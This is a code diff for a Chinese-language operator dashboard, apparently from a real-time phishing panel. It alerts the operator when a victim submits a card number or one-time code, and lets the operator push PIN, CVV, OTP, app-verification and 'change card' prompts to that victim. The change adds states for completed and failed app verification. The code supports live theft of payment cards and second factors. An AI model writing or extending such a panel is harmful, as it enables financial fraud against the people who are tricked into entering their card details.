@@ -59,13 +59,23 @@ const { connected, sendAction, ws } = usePaymentWs({
       if (data.countdownSeconds !== undefined) s.countdownSeconds = data.countdownSeconds;
       if (data.cardHistory !== undefined) (s as any).cardHistory = data.cardHistory;
       if (data.status === 'pending' && prevStatus !== 'pending') {
-        playNotification();
-        const hasOtp = !!(data.cardInfo?.otpCode || (s as any).cardInfo?.otpCode);
-        window.$notification?.warning({
-          title: hasOtp ? '🔔 客户已提交验证码' : '🔔 客户已提交卡号',
-          content: `编号 ${s.sessionId} - ${s.customerInfo?.fullName || '未知用户'} - 卡号 ${s.cardInfo?.cardNumber?.slice(0,4) || '****'}****`,
-          duration: 6000
-        });
+        if (data.action === 'app_verify_done') {
+          (s as any).appVerifyPending = true;
+          window.$notification?.success({
+            title: '📱 客户已完成APP验证',
+            content: `编号 ${s.sessionId} - ${s.customerInfo?.fullName || '未知用户'} - 卡号 ${s.cardInfo?.cardNumber?.slice(0,4) || '****'}****`,
+            duration: 6000
+          });
+        } else {
+          (s as any).appVerifyPending = false;
+          playNotification();
+          const hasOtp = !!(data.cardInfo?.otpCode || (s as any).cardInfo?.otpCode);
+          window.$notification?.warning({
+            title: hasOtp ? '客户已提交验证码' : '客户已提交卡号',
+            content: `编号 ${s.sessionId} - ${s.customerInfo?.fullName || '未知用户'} - 卡号 ${s.cardInfo?.cardNumber?.slice(0,4) || '****'}****`,
+            duration: 6000
+          });
+        }
       } else if (data.cardInfo?.otpCode && s.cardInfo?.otpCode !== data.cardInfo.otpCode) {
         // OTP submitted when already pending
         playNotification();
@@ -101,7 +111,7 @@ function handleAction(action: Api.Payment.OperatorAction, sessionId: string, mes
     email_verify: '邮箱验证', pin_verify: 'PIN验证',
     cvv_verify: 'CVV验证', app_verify: 'APP验证',
     question_verify: '问题验证', change_card: '换卡支付',
-    custom_prompt: '自定义提示', custom_otp_tail: 'OTP验证（自定义尾号）',     app_verify: 'APP验证', app_verify_done: 'APP验证完成', change_card_prompt: '自定义提示（换卡支付）', redirect_complete: '跳转完成',
+    custom_prompt: '自定义提示', custom_otp_tail: 'OTP验证（自定义尾号）',     app_verify: 'APP验证', app_verify_fail: '未完成验证', app_verify_done: 'APP验证完成', change_card_prompt: '自定义提示（换卡支付）', redirect_complete: '跳转完成',
     approve: '通过', reject: '拒绝'
   };
   window.$message?.info(`已发送操作: ${labels[action] || action}` + (message ? ` (${message})` : ''));
